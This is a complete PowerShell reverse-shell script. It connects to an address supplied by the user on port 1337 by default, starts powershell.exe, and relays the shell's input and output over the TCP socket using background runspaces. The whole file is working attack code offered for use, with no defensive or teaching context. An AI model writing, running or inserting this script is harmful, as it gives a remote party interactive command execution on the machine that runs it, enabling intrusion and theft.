# Compatible with Powershell 3+

param (
    [Parameter(Position = 0, Mandatory = $true)]
    [String]$address,

    [Parameter(Position = 1, Mandatory = $false)]
    [String]$port = 1337,

    [Parameter(Position = 2, Mandatory = $false)]
    [String]$filename = 'powershell.exe',

    [Parameter(Position = 3, Mandatory = $false)]
    [String]$arguments = ''
)


try
{
    $socket = New-Object System.Net.Sockets.TcpClient($address, $port)
}
catch
{
    Write-Error "Failed to establish connection to server: $_"
    exit 1
}

try
{
    $socket_stream = $socket.GetStream()
}
catch
{
    $socket.Dispose()
    Write-Error "Failed to get stream from socket: $_"
    exit 1
}

try
{
    $process_start_info = New-Object System.Diagnostics.ProcessStartInfo($filename, $arguments)
    $process_start_info.UseShellExecute = $false
    $process_start_info.CreateNoWindow = $false
    $process_start_info.RedirectStandardInput = $true
    $process_start_info.RedirectStandardOutput = $true
    $process_start_info.RedirectStandardError = $true

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $process_start_info
    
    [void]$process.Start()
}
catch
{
    $socket.Dispose()
    Write-Error "Failed to start process: $_"
    exit 1
}


$input_redirector = {
    param (
        [System.IO.Stream]$from_socket,
        [System.IO.Stream]$to_stdin
    )

    $buffer = New-Object Byte[] 1024

    while ($true)
    {
        try
        {
            $bytes_read = $from_socket.Read($buffer, 0, $buffer.Length)

            if ($bytes_read -eq 0)
            {
                $to_stdin.Flush()
                break # stream has been closed, connection was probably terminated
            }

            $to_stdin.Write($buffer, 0, $bytes_read)
            [Array]::Clear($buffer, 0, $bytes_read)

            if (-not $from_socket.DataAvailable)
            {
                $to_stdin.Flush()
            }
        }
        catch
        {
            Write-Error "Something went wrong during socket output -> process input piping: $_"
            break
        }
    }
}

$output_redirector = {
    param (
        [System.IO.Stream]$from_stdout, # or stderr
        [System.IO.Stream]$to_socket,
        [String]$mutex_name
    )

    $locked = $false
    $lock = New-Object System.Threading.Mutex($false, $mutex_name)
    $buffer = New-Object Byte[] 1024

    while ($true)
    {
        try
        {
            $bytes_read = $from_stdout.Read($buffer, 0, $buffer.Length)

            if ($bytes_read -eq 0)
            {
                if ($locked)
                {
                    $to_socket.Flush()
                    $lock.ReleaseMutex()
                    $locked = $false
                }

                break # stream has been closed, process probably exited
            }

            if (-not $locked)
            {
                [void]$lock.WaitOne()
                $locked = $true
            }

            $to_socket.Write($buffer, 0, $bytes_read)
            [Array]::Clear($buffer, 0, $bytes_read)

            if (-not $from_stdout.DataAvailable -and $locked)
            {
                $to_socket.Flush()
                $lock.ReleaseMutex()
                $locked = $false
            }
        }
        catch
        {
            Write-Error "Something wen't wrong during process output -> socket input piping: $_"
            break
        }
    }
}


$socket_mutex_name = [Guid]::NewGuid().ToString()

$runspace_pool = [RunspaceFactory]::CreateRunspacePool(3, 3)
$runspace_pool.Open()

$threads = @()
$scripts = @(
    [PowerShell]::Create().AddScript($input_redirector).AddArgument($socket_stream).AddArgument($process.StandardInput.BaseStream),
    [PowerShell]::Create().AddScript($output_redirector).AddArgument($process.StandardOutput.BaseStream).AddArgument($socket_stream).AddArgument($socket_mutex_name),
    [PowerShell]::Create().AddScript($output_redirector).AddArgument($process.StandardError.BaseStream).AddArgument($socket_stream).AddArgument($socket_mutex_name)
)

$scripts | ForEach-Object {
    $_.RunspacePool = $runspace_pool
    $threads += $_.InvokeAsync()
}


while ($true)
{
    $threads_completed = $threads | Where-Object { $_.IsCompleted }
    $threads_faulted = $threads | Where-Object { $_.IsFaulted }

    if ($threads_completed -or $threads_faulted)
    {
        $threads_faulted | ForEach-Object {
            Write-Error $_.Exception.Message
        }

        break
    }
    
    Start-Sleep -Milliseconds 250
}


$runspace_pool.Dispose()
$process.Dispose()
$socket.Dispose()